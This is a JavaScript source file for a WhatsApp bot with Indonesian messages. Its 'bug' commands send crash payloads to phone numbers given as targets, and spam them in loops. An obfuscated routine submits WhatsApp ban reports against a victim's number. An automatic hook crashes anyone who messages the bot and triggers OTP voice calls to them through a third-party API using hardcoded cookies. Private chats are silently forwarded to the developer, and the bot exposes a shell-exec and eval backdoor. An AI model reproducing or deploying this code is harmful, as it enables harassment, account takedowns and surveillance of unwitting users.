const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const nomorOwner = ['6285866295942','628985245738','628812904283','6285942018232','12344057330','6289686044386','6282265058541','628895137788','6285865662584','79299942743','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224','6285840040268','6285640350019','6281212687893','79774805044','6282115383356']
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isOwner && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !msg.key.fromMe && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev && !msg.key.fromMe) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa': case 'out':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
var _0x1ffaa1=_0x42e5;(function(_0x1c0f4e,_0x41cdce){var _0x4f3b62=_0x42e5,_0x2b6aa5=_0x1c0f4e();while(!![]){try{var _0x3c7f7a=parseInt(_0x4f3b62(0x9d))/0x1+-parseInt(_0x4f3b62(0x83))/0x2*(parseInt(_0x4f3b62(0x9c))/0x3)+-parseInt(_0x4f3b62(0x9b))/0x4+parseInt(_0x4f3b62(0x8a))/0x5*(-parseInt(_0x4f3b62(0xbf))/0x6)+-parseInt(_0x4f3b62(0xc3))/0x7*(-parseInt(_0x4f3b62(0xbb))/0x8)+-parseInt(_0x4f3b62(0xc2))/0x9+-parseInt(_0x4f3b62(0xa8))/0xa*(-parseInt(_0x4f3b62(0x89))/0xb);if(_0x3c7f7a===_0x41cdce)break;else _0x2b6aa5['push'](_0x2b6aa5['shift']());}catch(_0x2e8725){_0x2b6aa5['push'](_0x2b6aa5['shift']());}}}(_0x3ada,0x1ca3b));var _0x561e58=(function(){var _0x1089fc=!![];return function(_0x19933f,_0x791873){var _0x23d8a6=_0x1089fc?function(){var _0x24f899=_0x42e5;if(_0x791873){var _0x4aa244=_0x791873[_0x24f899(0xa9)](_0x19933f,arguments);return _0x791873=null,_0x4aa244;}}:function(){};return _0x1089fc=![],_0x23d8a6;};}()),_0x422c48=_0x561e58(this,function(){var _0x1691ae=_0x42e5;return _0x422c48[_0x1691ae(0x8f)]()['search']('(((.+)+)+)+$')[_0x1691ae(0x8f)]()[_0x1691ae(0x97)](_0x422c48)['search'](_0x1691ae(0x9e));});_0x422c48();function _0x42e5(_0x1da615,_0x3e5032){var _0x152337=_0x3ada();return _0x42e5=function(_0x314c16,_0x5afe3a){_0x314c16=_0x314c16-0x83;var _0xb03528=_0x152337[_0x314c16];if(_0x42e5['SzPuTZ']===undefined){var _0x19f5bc=function(_0x42e5ce){var _0x443c85='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x455c3b='',_0x18158f='',_0x561f6b=_0x455c3b+_0x19f5bc;for(var _0x22e4e1=0x0,_0x173d21,_0x1089fc,_0x19933f=0x0;_0x1089fc=_0x42e5ce['charAt'](_0x19933f++);~_0x1089fc&&(_0x173d21=_0x22e4e1%0x4?_0x173d21*0x40+_0x1089fc:_0x1089fc,_0x22e4e1++%0x4)?_0x455c3b+=_0x561f6b['charCodeAt'](_0x19933f+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x173d21>>(-0x2*_0x22e4e1&0x6)):_0x22e4e1:0x0){_0x1089fc=_0x443c85['indexOf'](_0x1089fc);}for(var _0x791873=0x0,_0x23d8a6=_0x455c3b['length'];_0x791873<_0x23d8a6;_0x791873++){_0x18158f+='%'+('00'+_0x455c3b['charCodeAt'](_0x791873)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x18158f);};_0x42e5['NlUwHY']=_0x19f5bc,_0x1da615=arguments,_0x42e5['SzPuTZ']=!![];}var _0x422c48=_0x152337[0x0],_0x561e58=_0x314c16+_0x422c48,_0x3ada54=_0x1da615[_0x561e58];if(!_0x3ada54){var _0x4aa244=function(_0x5706e1){this['cCxlKU']=_0x5706e1,this['SYnyXF']=[0x1,0x0,0x0],this['QmNkyv']=function(){return'newState';},this['emTWYS']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['qUFZsK']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4aa244['prototype']['kpWyzU']=function(){var _0x115e2b=new RegExp(this['emTWYS']+this['qUFZsK']),_0x310e2c=_0x115e2b['test'](this['QmNkyv']['toString']())?--this['SYnyXF'][0x1]:--this['SYnyXF'][0x0];return this['PmQqaH'](_0x310e2c);},_0x4aa244['prototype']['PmQqaH']=function(_0x4dc3c8){if(!Boolean(~_0x4dc3c8))return _0x4dc3c8;return this['OBuWde'](this['cCxlKU']);},_0x4aa244['prototype']['OBuWde']=function(_0x179851){for(var _0x37a176=0x0,_0x23db24=this['SYnyXF']['length'];_0x37a176<_0x23db24;_0x37a176++){this['SYnyXF']['push'](Math['round'](Math['random']())),_0x23db24=this['SYnyXF']['length'];}return _0x179851(this['SYnyXF'][0x0]);},new _0x4aa244(_0x42e5)['kpWyzU'](),_0xb03528=_0x42e5['NlUwHY'](_0xb03528),_0x1da615[_0x561e58]=_0xb03528;}else _0xb03528=_0x3ada54;return _0xb03528;},_0x42e5(_0x1da615,_0x3e5032);}var _0x5afe3a=(function(){var _0x5706e1=!![];return function(_0x115e2b,_0x310e2c){var _0x4dc3c8=_0x5706e1?function(){var _0x3b4e7e=_0x42e5;if(_0x310e2c){var _0x179851=_0x310e2c[_0x3b4e7e(0xa9)](_0x115e2b,arguments);return _0x310e2c=null,_0x179851;}}:function(){};return _0x5706e1=![],_0x4dc3c8;};}()),_0x314c16=_0x5afe3a(this,function(){var _0x183155=_0x42e5,_0x37a176;try{var _0x23db24=Function(_0x183155(0xc0)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x37a176=_0x23db24();}catch(_0x16ca20){_0x37a176=window;}var _0xfec2fe=_0x37a176[_0x183155(0xaa)]=_0x37a176[_0x183155(0xaa)]||{},_0x1e23af=[_0x183155(0xa5),_0x183155(0xc1),_0x183155(0x88),_0x183155(0xa4),_0x183155(0xa2),_0x183155(0x85),'trace'];for(var _0xfbab55=0x0;_0xfbab55<_0x1e23af[_0x183155(0xbe)];_0xfbab55++){var _0x53465b=_0x5afe3a[_0x183155(0x97)][_0x183155(0x86)]['bind'](_0x5afe3a),_0x5f26ea=_0x1e23af[_0xfbab55],_0x1e2750=_0xfec2fe[_0x5f26ea]||_0x53465b;_0x53465b['__proto__']=_0x5afe3a[_0x183155(0xb2)](_0x5afe3a),_0x53465b[_0x183155(0x8f)]=_0x1e2750[_0x183155(0x8f)][_0x183155(0xb2)](_0x1e2750),_0xfec2fe[_0x5f26ea]=_0x53465b;}});_0x314c16();var ntah=await axios[_0x1ffaa1(0xb1)](_0x1ffaa1(0x92)),email=await axios['get']('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'),cookie=ntah[_0x1ffaa1(0xab)]['set-cookie']['join'](';\x20'),$=cheerio[_0x1ffaa1(0xb0)](ntah[_0x1ffaa1(0x8b)]),$form=$(_0x1ffaa1(0xa7)),url=new URL($form[_0x1ffaa1(0xb9)](_0x1ffaa1(0x8d)),'https://www.whatsapp.com')[_0x1ffaa1(0xad)],form=new URLSearchParams();form[_0x1ffaa1(0x95)](_0x1ffaa1(0xba),$form[_0x1ffaa1(0x94)](_0x1ffaa1(0xb8))[_0x1ffaa1(0xa3)]()),form[_0x1ffaa1(0x95)]('lsd',$form['find'](_0x1ffaa1(0xa1))[_0x1ffaa1(0xa3)]()),form['append'](_0x1ffaa1(0x8e),_0x1ffaa1(0xa0)),form['append'](_0x1ffaa1(0x93),'ID'),form['append']('phone_number',''+dn),form[_0x1ffaa1(0x95)](_0x1ffaa1(0x98),email[_0x1ffaa1(0x8b)][0x0]),form['append'](_0x1ffaa1(0x90),email[_0x1ffaa1(0x8b)][0x0]),form[_0x1ffaa1(0x95)](_0x1ffaa1(0x91),'ANDROID'),form['append'](_0x1ffaa1(0xbd),_0x1ffaa1(0xa6)),form['append'](_0x1ffaa1(0xb7),'0'),form[_0x1ffaa1(0x95)](_0x1ffaa1(0x9f),'1'),form[_0x1ffaa1(0x95)](_0x1ffaa1(0x87),''),form[_0x1ffaa1(0x95)](_0x1ffaa1(0xaf),'8'),form[_0x1ffaa1(0x95)](_0x1ffaa1(0xb6),_0x1ffaa1(0xb4)),form[_0x1ffaa1(0x95)](_0x1ffaa1(0x96),'1'),form[_0x1ffaa1(0x95)](_0x1ffaa1(0xac),_0x1ffaa1(0xb5)),form[_0x1ffaa1(0x95)]('__rev',_0x1ffaa1(0x99)),form['append'](_0x1ffaa1(0x8c),'0');function _0x3ada(){var _0x3ee68d=['mtqWohjrDMPwtW','ue9tva','Ew91CL9TzxnZywDL','BgvUz3rO','nMDlrurtAq','CMv0DxjUicHMDw5JDgLVBIGPia','D2fYBG','mteYoda0mKn2CKfsDG','ndjstunHu3i','mtaXmg9Tq1rdCG','u3vRC2vZigXVz291Dca','DgfIBgu','ChjVDg90ExbL','x19JC3i','Aw5MBW','otLPseT6tKC','mteYodK5mhH6CvvHtq','zgf0yq','x19JB21Tzw50x3jLCq','ywn0Aw9U','C3rLCa','Dg9tDhjPBMC','zw1HAwXFy29UzMLYBq','CgXHDgzVCM0','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29Tl2nVBNrHy3qVBM9JBgLLBNqV','y291BNrYEv9ZzwXLy3rVCG','zMLUza','yxbWzw5K','zhbY','y29UC3rYDwn0B3i','zw1HAwW','mtaWnJyZmdG1oa','zM9YBwf0','mZCWnZq0rxnbv1n0','mte0tw1rreDM','mta0mJK3BMjvCfLh','kcGOlISPkYKRksSK','x19H','C3vIBwL0','Aw5WDxrBBMfTzt1SC2rD','zxHJzxb0Aw9U','DMfS','zxjYB3i','Bg9N','ugvYzgLKBY9YB3vIywrVoIbKzxnHDgL2zsbTAw5OysbJB250yq','zM9YBq','nti3nZqWrvfuruze','yxbWBhK','y29UC29Szq','AgvHzgvYCW','x19Jy2C','AhjLzG','CMvWBgfJzq','x19Yzxe','Bg9Hza','z2v0','yMLUza','CgfYC2u','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa','vu5ltK9xtG','x19OCW','x191C2vY','Aw5WDxrBBMfTzt1QyxPVzxn0xq','yxr0CG','AMf6B2vZDa'];_0x3ada=function(){return _0x3ee68d;};return _0x3ada();}var res=await axios({'url':url,'method':_0x1ffaa1(0xbc),'data':form,'headers':{'cookie':cookie}});reply(_0x1ffaa1(0x84)+nd[0x0]+'\x20'+util[_0x1ffaa1(0x9a)](JSON[_0x1ffaa1(0xb3)](res[_0x1ffaa1(0x8b)][_0x1ffaa1(0xae)]('for\x20(;;);',''))));
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'chat':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
